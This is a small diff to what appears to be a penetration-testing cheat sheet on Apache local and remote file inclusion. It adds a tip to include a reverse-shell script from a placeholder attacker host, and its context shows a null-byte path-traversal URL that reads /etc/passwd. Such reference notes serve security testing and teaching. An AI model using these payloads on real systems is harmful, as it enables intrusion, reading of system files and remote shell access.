@@ -71,6 +71,7 @@ Apache
 * Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout
 
 LFI / RFI
+(LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
 ```
 # Append NULL bytes (prevent .ext concat to the end by application)
 http://example.com/index.php?page=../../../etc/passwd%00
